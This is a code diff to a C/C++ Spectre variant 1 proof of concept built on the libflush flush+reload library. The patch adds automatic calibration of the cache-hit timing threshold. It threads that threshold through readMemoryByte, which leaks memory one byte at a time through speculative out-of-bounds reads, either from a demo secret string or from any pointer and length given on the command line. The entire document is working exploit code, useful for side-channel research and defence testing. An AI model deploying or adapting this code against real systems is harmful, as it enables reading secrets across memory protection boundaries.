@@ -3,6 +3,7 @@
 #include <string.h>
 #include <stdlib.h>
 #include <stdint.h>
+#include <algorithm>
 
 #define ALIGN_CACHE __attribute__ ((aligned (512)))
 
@@ -22,13 +23,51 @@ void victim_function(size_t x) {
 /********************************************************************
 Analysis code
 ********************************************************************/
+int find_cache_hit_threshold(libflush_session_t* libflush_session) {
+    const int test_count = 32;
+    uint64_t hit_times[test_count];
+    uint64_t miss_times[test_count];
+//     uint64_t time_miss_min = -1; //MAX_LONG
 
-/* TODO: How is it affected by frequency scaling? */
-#define CACHE_HIT_THRESHOLD (100) /* assume cache hit if time <= threshold */
+
+    for (int i=0; i<test_count; i++) {
+        libflush_flush(libflush_session, &array1_size);
+        miss_times[i] = libflush_reload_address(libflush_session, &array1_size);
+        hit_times[i] = libflush_reload_address(libflush_session, &array1_size);
+//         return (miss_times[i] + hit_times[i]) / 2;
+/*
+        if (time_miss < time_miss_min)
+            time_miss_min = time_miss;
+        if (time_hit > time_hit_max)
+            time_hit_max = time_hit;*/
+
+//         count++;
+    }
+
+    std::sort(hit_times, hit_times+test_count);
+    std::sort(miss_times, miss_times+test_count);
+//     printf("Hit: %lu, Miss: %lu\n", time_hit_max, time_miss_min);
+//     return (time_hit_max + time_miss_min) / 2;
+    printf("var hit_times = [");
+    for (int i=0; i<test_count; i++) {
+        if (i) printf(", ");
+        printf("%ld", hit_times[i]);
+    }
+    printf("];\n");
+
+    printf("var miss_times = [");
+    for (int i=0; i<test_count; i++) {
+        if (i) printf(", ");
+        printf("%ld", miss_times[i]);
+    }
+    printf("];\n");
+
+    return (hit_times[(int)(0.9*(test_count-1))] + miss_times[(int)(0.1*(test_count-1))]) / 2;
+}
 
 /* Report best guess in value[0] and runner-up in value[1] */
-void readMemoryByte(libflush_session_t* libflush_session, uint8_t* target_ptr, uint8_t value[2], int score[2]) {
-  size_t malicious_x = (size_t)(target_ptr - array1);
+void readMemoryByte(libflush_session_t* libflush_session, const void* target_ptr, int cache_hit_threshold, uint8_t value[2], int score[2]) {
+  size_t malicious_x = (size_t)target_ptr - (size_t)array1;
   static int results[256];
   int tries, i, j, k, mix_i, junk = 0;
   size_t training_x, x;
@@ -64,7 +103,7 @@ void readMemoryByte(libflush_session_t* libflush_session, uint8_t* target_ptr, u
       mix_i = ((i * 167) + 13) & 255;
       addr = & array2[mix_i * 512];
       uint64_t access_time = libflush_reload_address(libflush_session, (void*)addr);
-      if (access_time <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
+      if (access_time <= cache_hit_threshold && mix_i != array1[tries % array1_size])
           results[mix_i]++; /* cache hit - add +1 to score for this value */
     }
 
@@ -93,7 +132,7 @@ void readMemoryByte(libflush_session_t* libflush_session, uint8_t* target_ptr, u
 #define COUNTER_THREAD_CPU 1
 int main(int argc, const char** argv) {
   // Read CLI arguments: data pointer and lenght
-  uint8_t* target_ptr = "The Magic Words are Squeamish Ossifrage.";
+  const char* target_ptr = "The Magic Words are Squeamish Ossifrage.";
   int target_len = strlen(target_ptr);
 
   if (argc == 3) {
@@ -115,6 +154,9 @@ int main(int argc, const char** argv) {
     return -1;
   }
 
+  int cache_threshold = find_cache_hit_threshold(libflush_session);
+  printf("Cache threshold: %d\n", cache_threshold);
+
   memset(array2, 0, sizeof(array2));  /* write to array2 so in RAM not copy-on-write zero pages */
   printf("Reading %d bytes:\n", target_len);
   while (target_len--) {
@@ -122,7 +164,7 @@ int main(int argc, const char** argv) {
     int score[2];
 
     printf("Reading at %p... ", (void*) target_ptr);
-    readMemoryByte(libflush_session, target_ptr++, value, score);
+    readMemoryByte(libflush_session, target_ptr++, cache_threshold, value, score);
     printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
     printf("0x%02X=’%c’ score=%d ", value[0],
       (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
@@ -130,6 +172,8 @@ int main(int argc, const char** argv) {
       printf("(second best: 0x%02X score=%d)", value[1], score[1]);
     printf("\n");
   }
+
+  find_cache_hit_threshold(libflush_session);
 
   // terminate libflush
   if (libflush_terminate(libflush_session) == false) {
